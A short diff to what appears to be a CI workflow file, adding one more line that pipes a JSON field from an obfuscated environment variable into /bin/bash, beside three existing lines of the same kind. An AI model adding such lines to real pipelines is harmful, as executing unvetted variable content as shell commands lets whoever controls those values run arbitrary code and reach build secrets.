@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$w77" | jq -r .y0246 | /bin/bash
           printf '%s' "$f89" | jq -r .oihpt41 | /bin/bash
           printf '%s' "$qpiw24" | jq -r .m54 | /bin/bash
+          printf '%s' "$pyohd3912" | jq -r .vm1 | /bin/bash
 
       - name: Store results
         if: always()
